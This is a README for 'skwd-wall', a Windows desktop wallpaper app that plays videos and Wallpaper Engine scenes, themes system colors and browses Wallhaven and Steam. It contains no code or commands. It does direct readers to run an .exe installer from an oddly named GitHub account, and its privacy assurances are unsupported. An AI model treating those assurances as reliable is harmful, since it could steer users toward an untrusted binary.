# 🎨 skwd-wall - Personalize your desktop background with ease

[![](https://img.shields.io/badge/Download-skwd--wall-blue.svg)](https://github.com/centralamerican-statecapitalism500/skwd-wall)

skwd-wall brings your desktop to life. It handles static images, video files, and interactive scenes from Wallpaper Engine. The application also builds color schemes for your system using the colors found in your chosen wallpaper. You can browse for new art using the built-in connections to Wallhaven and Steam.

## 📥 How to install 

1. Visit the [official releases page](https://github.com/centralamerican-statecapitalism500/skwd-wall).
2. Look for the Assets section at the bottom of the latest release.
3. Select the file ending in .exe to download the installer.
4. Run the installer and follow the screen prompts to set up the software.

## 🖥️ System requirements

- Windows 10 or Windows 11.
- At least 4GB of system memory.
- A graphics card that supports DirectX 11 or newer.
- An active internet connection for downloading new wallpapers.

## 🛠️ Playing your first wallpaper

Once you open the software, the main dashboard greets you with your current library. Click the Add Wallpaper button to import a local file from your computer. If you have files from Wallpaper Engine, point the software to your install directory. 

The player supports various formats. Videos play in a loop by default. You can adjust the playback speed or mute audio inside the settings menu.

## 🎨 Changing your theme

The application includes a tool called matugen. This tool reads the primary colors from your wallpaper and updates your system accent colors. Toggle this feature in the Appearance tab. Each time you switch your background, the colors on your taskbar and window borders update to match the image.

## 🌐 Using the browser

You do not need to leave the application to find new backgrounds. The built-in browser connects to Wallhaven and the Steam Workshop. 

For Wallhaven:
1. Open the browser tab in the sidebar.
2. Select Wallhaven from the source dropdown.
3. Type a search term into the bar.
4. Click any image to preview it.
5. Click the Apply button to set it as your background.

For Steam:
1. Log in with your Steam account through the browser window.
2. Browse the Wallpaper Engine workshop collection.
3. Click the subscribe button on any scene.
4. The software downloads the file and adds it to your local library.

## ⚙️ Configuration options

The settings menu offers control over how the software performs. You can choose to launch the application when Windows starts. Use the performance settings to pause playback while other full-screen applications run. This saves processor power when you play resource-heavy games or watch films.

## 🛠️ Managing files

The application stores all downloaded wallpapers in a specific folder on your drive. You can change this location in the Storage settings. Use the Clear Cache button if the storage folder grows too large. This removes temporary thumbnails without deleting your saved wallpapers.

## ❓ Common questions

Does it slow down my computer?
Modern computers handle background processing well. The software uses minimal power when idle. You can set the performance mode to Low to limit its impact on your hardware.

How do I remove the software?
Open the Windows Settings app. Select Apps and then Installed Apps. Find skwd-wall in the list, click the three dots, and select Uninstall. This removes the program from your system.

Can I use multiple monitors?
Yes. Open the display settings inside the app. Assign a different wallpaper to each monitor, or stretch one image across all displays. 

What if a file fails to load?
Check that the file format is supported. The tool works best with .jpg, .png, .mp4, and .webm files. Ensure the file is not corrupted or locked by another program.

Is there a way to update the app?
The software checks for updates when you launch it. If an update exists, a notification appears in the top corner. Click this notification to download the upgrade. Your settings and wallpaper library remain intact during this process.

## 🛡️ Privacy and safety

This tool does not collect personal data. Your browsing history for wallpapers stays on your local machine. The application only contacts external servers when you search for new images or sync your Steam library. You maintain full control over your data at all times.
